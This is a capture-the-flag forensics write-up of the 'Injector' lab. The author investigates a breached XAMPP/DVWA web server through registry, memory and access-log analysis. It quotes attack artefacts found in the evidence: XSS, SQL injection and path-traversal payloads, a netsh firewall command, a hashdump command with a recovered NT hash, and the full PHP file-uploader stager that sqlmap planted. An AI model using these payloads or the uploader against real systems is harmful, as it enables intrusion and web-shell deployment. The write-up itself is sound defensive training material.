# Injector Challenge
![This is an image](/Injector/Images/Injectorhead.png)

## Challenge Link
https://cyberdefenders.org/labs/23

## Challenge Information
- Image Size: 	 2.9 GB
- Image Format: .mem & Image file
- Tags: 
    -  	Volatility 
    -  	Autopsy 
    -  	Web Server 
    -  	DFIR 
    -  	Memory analysis 
    -  	FTK Imager 
    
 

## Scenario
> A company’s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis. As a security analyst, you are tasked with mounting the image to determine how the system was compromised and the actions/commands the attacker executed.

## Tools Used
    • FTK Imager
        ◦ FTK® Imager is a data preview and imaging tool.
    • Volatility
        ◦ Volatility is an open-source memory forensics framework for incident response and malware analysis.
    • Regripper 
        ◦ RegRipper is an open source tool, written in Perl, for extracting/parsing information (keys, values, data) from the Registry and presenting it for analysis
    • Cyberchef
        ◦ The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.
        
         
 ## Questions:  
  	
### 1 	What is the computer's name?
I used `Regripper` to extract the information from the `SOFTWARE` file into readable text file, the files location `\Windows\System32\config\`

#### Registry Path:
> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName

![q1](/Injector/Images/q1.png)

> **Flag: WIN-L0ZZQ76PMUF**

### 2 	What is the Timezone of the compromised machine? Format: UTC+0 (no-space)
I used `Regripper` to extract the information from the `SYSTEM` file into readable text file, the files location `\Windows\System32\config\`

### Registry Path:
> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TimeZoneInformation

![q2](/Injector/Images/q2.png)

The time zone is in `Pacific Standard Time` format, Places in this zone observe standard time by subtracting eight hours from Coordinated Universal Time (UTC−08:00). During daylight saving time, a time offset of UTC−07:00 is used. 

#### Source:
> https://en.wikipedia.org/wiki/Pacific_Time_Zone

> **Flag: UTC-7**

### 3 	What was the first vulnerability the attacker was able to exploit?
When I went through the files inside the IMAGE, I notice the folder `xampp`.

#### Explanation:
> XAMPP is a software distribution which provides the Apache web server, MySQL database (actually MariaDB), Php and Perl.

`XAMPP `store the access log in `\xampp\apache\logs\access.log`

So I know that the most common web vulnerabilities are: 

#### XSS:
> Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites

#### SQL:
> SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed

#### LFI:
> Local file inclusion occurs when the web application executes a local files i.e. files on the current server can be included for execution. These files are usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application. 

First, i started to search evidence for XSS attack in the access log.
The common XSS attack are with script tags

#### Example:
`<script>alert('xss');</script>`

![q3](/Injector/Images/q3.png)

I found this line in the log `GET /dvwa/security.php?test=%22><script>eval(window.name)</script> HTTP/1.1" 200`

The line contain XSS attempt

> **Flag: XSS**


### 4 	What is the OS build number?
I used `Regripper` to extract the information from the `SOFTWARE` file into readable text file, the files location `\Windows\System32\config\`

#### Registry Path:
> HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion

![q4](/Injector/Images/q4.png)

> **Flag: 6001**

### 5 	How many users are on the compromised machine?
I used `Regripper` to extract the information from the `SAM` file into readable text file, the files location `\Windows\System32\config\`

> SAM file is database used to store user account information, including password, account groups, access rights, and special privileges in Windows operating system.

![q5](/Injector/Images/q5.png)

> **Flag: 4**

### 6 	What is the webserver package installed on the machine?
I used `SOFTWARE` to extract the information from the `SAM` file into readable text file, the files location `\Windows\System32\config\`

#### Registry Path:
> For 32bit system: Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall 

> For 64bit system: Software\Microsoft\Windows\CurrentVersion\Uninstall

![q6](/Injector/Images/q6.png)

#### Explanation:
> XAMPP is a software distribution which provides the Apache web server, MySQL database (actually MariaDB), Php and Perl 

> **Flag: xampp**

### 7 	What is the name of the vulnerable web app installed on the webserver?
So we know that the webserver program is `XAMPP`.

`XAMPP` stored the web apps in `\xampp\htdocs`

![q7](/Injector/Images/q7.png)

#### Explanation:
> DVWA The Damn Vulnerable Web Application is a software project that intentionally includes security vulnerabilities and is intended for educational purposes.

> **Flag: dvwa**

### 8 	What is the user agent used in the HTTP requests sent by the SQL injection attack tool?

I searched evidence for SQL injection attack in access.log 

The common SQL injection syntex

#### Example:
> a'+or+1=1

![q8](/Injector/Images/q8.png)

I found this line in the log `GET /dvwa/vulnerabilities/sqli/?id=a%27+or+1%3D1&Submit=Submit`
I decoded the data with url decoding and get`GET/dvwa/vulnerabilities/sqli/?id=a'+or+1=1&Submit=Submit` , this match to SQL injection attempt
I looked down the log and saw the line `sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)`

#### Explanation:
> sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database 

> **Flag: sqlmap/1.0-dev-nongit-20150902**

### 9 	The attacker read multiple files through LFI vulnerability. One of them is related to network configuration. What is the filename?

As i explaind before: 

#### LFI:
> Local file inclusion occurs when the web application executes a local files i.e. files on the current server can be included for execution. These files are usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application. 

The common LFI attack syntex 

#### Example:
> ../../../../../etc/passwd%00 - allows an attacker to read the contents of the local /etc/passwd

I searched `./../../../../` in access.log and found `"GET /dvwa/vulnerabilities/fi/?page=../../../../../../windows/system32/drivers/etc/hosts`

![q9](/Injector/Images/q9.png)

The `hosts` file is a plain text file used to map host names to IP addresses

> **Flag: hosts**

### 10 The attacker tried to update some firewall rules using netsh command. Provide the value of the type parameter in the executed command?
After i searched at the access.log i didn't find any mention of using the `netsh` command, so i decided to investigate the memory file

I used `Volatility` to investigate the `memdump.mem`

The first thing i did is to find the memory profile.

`vol.py -f /home/sansforensics/Downloads/memdump.mem imageinfo`

![q10](/Injector/Images/vol-imageinfo.png)

After i found the right profile i used `cmdscan` plugin

#### Explanation:
> The cmdscan plugin searches the memory of csrss.exe Windows for commands that attackers entered through a console shell (cmd.exe).

`vol.py -f /home/sansforensics/Downloads/memdump.mem --profile=VistaSP2x86 cmdscan`

![q10a](/Injector/Images/vol-cmdscan.png)

we saw alots of netsh commands ran from cmd

`netsh firewall set service type=remotedesktop mode=enable scope=subnet`

#### Explanation:
> netsh firewall set service  - Set firewall service configuration
> 
> type - Service type - REMOTEDESKTOP - Remote assistance and remote desktop
> 
> mode - Service mode -   ENABLE  - Allow through firewall
> 
> scope - Service scope -  SUBNET - Allow only local network (subnet) traffic through firewall
> 

The command is used to open the `RDP` service in `Windows Firewall`

> **Flag: remotedesktop**

### 11 How many users were added by the attacker?

To find the users on the machine used the `SAM` file 

First i ran the `hivelist` command 
 
  
 #### Explanation:
 > To locate the virtual addresses of registry hives in memory, and the full paths to the corresponding hive on disk, use the `hivelist` command. If you want to print values from a certain hive, run this command first so you can see the address of the hives.
 
 `vol.py -f /home/sansforensics/Downloads/memdump.mem --profile=VistaSP2x86 hivelist`
 
#### Explanation:
> The `hashdump` plugin extract and decrypt cached domain credentials stored in the registry, use the hashdump command. 
To use hashdump, pass the virtual address of the SYSTEM hive as -y and the virtual address of the SAM hive as -s.

`vol.py -f /home/sansforensics/Downloads/memdump.mem --profile=VistaSP2x86 hashdump -y 0x86226008 -s 0x87b7d008`

![q11](/Injector/Images/vol-hashdump.png)

Four users are found, two of them are windows default users..

> **Flag: 2**

### 12 When did the attacker create the first user?

I opened the `SAM` file to get the time the users account created.

> SAM file is database used to store user account information, including password, account groups, access rights, and special privileges in Windows operating system.

![q5](/Injector/Images/q5.png)

> **Flag:  2015-09-02 09:05:06 UTC **

### 13 What is the NThash of the user's password set by the attacker?

The `SAM` file conatin the LM hash and a NThash

![q13](/Injector/Images/q13.png)

> **Flag: 817875ce4794a9262159186413772644**

### 14 What is The MITRE ID corresponding to the technique used to keep persistence?

I searched for local Account creation and got

https://attack.mitre.org/techniques/T1136/001/

> **Flag:  T1136.001**

### 15 The attacker uploaded a simple command shell through file upload vulnerability. Provide the name of the URL parameter used to execute commands?
Because i am familiar with web shells, i know there is simple php web shell that work by execute commands that are being passed through ‘cmd’ HTTP GET request  parameter.

![q15a](/Injector/Images/q15a.png)

So i searched for `cmd=` in the access log.

![q15](/Injector/Images/q15.png)

> **Flag: cmd**

### 16 One of the uploaded files by the attacker has an md5 that starts with "559411". Provide the full hash.
I used FTK Imager to see all the files in vulnerable Web Application folder.

![q16](/Injector/Images/q16.png)

> **Flag: 5594112b531660654429f8639322218b**

### 17 The attacker used Command Injection to add user "hacker" to the "Remote Desktop Users" Group. Provide the IP address that was part of the executed command?

I used regex to find the different ip in access.log 

`((?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0`

![q17](/Injector/Images/q17.png)

> **Flag:  192.168.56.102**

### 18 The attacker dropped a shellcode through SQLi vulnerability. The shellcode was checking for a specific version of PHP. Provide the PHP version number?
I familiar with `sqlmap` ,and to write file through sql injection you need to use `INTO OUTFILE`


#### Explanation:
> SELECT `INTO OUTFILE` writes the resulting rows to a file, and allows the use of column and row terminators to specify a particular output format.

So i search for `OUTFILE` in the access log.

![q18a](/Injector/Images/q18a.png)

After i used `url decoding` , i can see the code cleary

![q18](/Injector/Images/q18.png)

I saw the code is `hexadecimal` so i used `Cyberchef` to decode him

![q18b](/Injector/Images/q18b.png)

`<?php
if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=\\xampp\\htdocs\\> <input type=submit name=upload value=upload></form>";}?>
`

We can see the command for checking a specific version of PHP

> **Flag:  4.1.0**

         
